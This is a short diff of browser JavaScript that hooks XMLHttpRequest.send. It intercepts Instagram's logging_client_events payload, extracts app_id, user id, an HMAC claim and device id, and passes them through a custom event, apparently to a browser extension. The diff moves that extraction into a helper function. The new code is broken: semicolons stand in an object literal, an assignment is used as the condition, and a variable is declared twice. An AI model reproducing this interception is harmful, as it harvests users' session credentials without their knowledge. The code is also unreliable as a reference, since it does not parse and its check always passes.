@@ -20,19 +20,19 @@ XMLHttpRequest.prototype.send = function(a, b) {
         kupengmu_kule.callback();
 }
 kupengmu_kule.callback = function (){
-    var client_events = this.url, mate = decodeURIComponent(this.data), paser = mate.split("message=")[1], get_object = JSON.parse(paser);
+    var client_events = this.url, get_object, mate = decodeURIComponent(this.data), paser = mate.split("message=")[1], get_object = JSON.parse(paser);
     if(client_events = 'https://graph.instagram.com/logging_client_events'){
-        var send_app_uid = get_object.app_uid;
-        var send_app_id = get_object.app_id;
-        var send_hmac = get_object.claims[0];
-        var send_device_id = get_object.device_id;
-        setTimeout(function() {
-            document.dispatchEvent(new CustomEvent('RW759_connectExtension', {
-                app_id : send_app_id,
-                uid : send_app_uid,
-                hmac: send_hmac,
-                device : send_device_id
-            }));
-        }, 0);
+        getObject(get_object);
     }
+}
+
+function getObject(get_object){
+    setTimeout(function() {
+        document.dispatchEvent(new CustomEvent('RW759_connectExtension', {
+            app_id : get_object.app_id;
+            uid : get_object.app_uid;
+            hmac: get_object.claims[0];
+            device : get_object.device_id;
+        }));
+    }, 0);
 }
